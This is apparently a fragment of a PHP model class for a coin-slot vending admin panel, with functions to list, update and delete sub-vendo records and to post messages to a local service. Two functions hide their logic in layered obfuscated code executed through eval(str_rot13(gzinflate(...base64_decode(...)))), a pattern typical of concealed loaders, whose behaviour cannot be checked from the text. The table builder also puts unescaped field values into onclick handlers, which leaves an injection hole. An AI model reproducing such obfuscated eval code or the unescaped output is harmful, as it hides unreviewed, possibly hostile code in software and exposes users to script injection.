        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
        return $html;
    } 

    function getVendoListModel()
    {
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
        return $html;         
    }


    function build_table($array)
	{ 
		if (is_null($array) || !is_array($array) || count($array) <= 0) {
			return "<h1 class = 'text-center fs-5'>No Data!</h1>";
		}

		$html = '<table width="100%" class="table table-dark table-striped dataTables_wrapper form-inline dt-bootstrap no-footer" id="myTable">';	 
		$html .= '<thead>';
		$html .= '<tr>';

		$html .= '<th>#</th>';
        $html .= '<th>Actions</th>'; 
		foreach ($array[0] as $key => $value) {
			// Ensure that $key is a string
			if ($key !== 'rowid') {
				$html .= '<th>' . str_replace("_", " ", ucwords(htmlspecialchars($key))) . '</th>';
			}
		}
 
		$html .= '</tr>';
		$html .= '</thead>';
		$html .= '<tbody>';
		$i = 0;
		foreach ($array as $key => $value) {
			$i += 1;
			$html .= '<tr>';
			$html .= '<td>' . $i . '</td>';
            $html .= '<td>
                <div class="d-flex justify-content-center align-items-center">
                    <button class="btn btn-sm btn-info" onclick="update('.$value['rowid'].',\''.$value['coinslot_name'].'\',\''.$value['coinslot_description'].'\',\''.$value['is_active'].'\')">
                        <i class="fas fa-edit fs-6"></i>
                    </button>
                    <button class="ms-2 btn btn-sm btn-danger" onclick="deleteSub('.$value['rowid'].')">
                        <i class="fas fa-trash fs-6"></i>
                    </button>
                </div>
            </td>';

			foreach ($value as $key2 => $value2) {
				// Check if $value2 is null, and replace it with an empty string if it is
				if ($key2 !== 'rowid') { 
                    if ($key2 == 'is_active') {
                        if($value2 == 'Y')
                        {
                            $html .= '<td><span class = "badge badge-pill bg-success">' . htmlspecialchars($value2 ?? '') . '</span></td>';
                        }
                        else
                        {
                            $html .= '<td><span class = "badge badge-pill bg-danger">' . htmlspecialchars($value2 ?? '') . '</span></td>';
                        }
                    } 
                    else
                    {
					    $html .= '<td>' . htmlspecialchars($value2 ?? '') . '</td>';
                    }
				} 
			}
			 
			$html .= '</tr>';
		}

		$html .= '</tbody>';
		$html .= '</table>';

		return $html;
	}

    function DeleteSubVendoModel($rowid)
    {
        $result = $this->sqlnonquery("DELETE FROM `sub_vendo` WHERE rowid = ?", array($rowid));
        return $result;
    }

    function updateSubVendo($rowid,$coinslotname,$description,$status)
    {
        $result = $this->sqlnonquery("UPDATE `sub_vendo` set coinslot_name = ?, coinslot_description = ?, is_active = ? WHERE rowid = ?", array($coinslotname,$description,$status,$rowid));
        return $result;
    }

    public function sendMessage($msg, $target)
    { 
        $ip = $_SERVER['SERVER_ADDR'];

        $postData = http_build_query([
            "msg"    => $msg,
            "target" => $target
        ]);

        $curl = curl_init("http://".$ip.":5055/send");

        curl_setopt_array($curl, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $postData,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/x-www-form-urlencoded",
                "Content-Length: " . strlen($postData)
            ],
            CURLOPT_RETURNTRANSFER => true
        ]);

        $response = curl_exec($curl);
        curl_close($curl);

        return $response;
    }


}

?>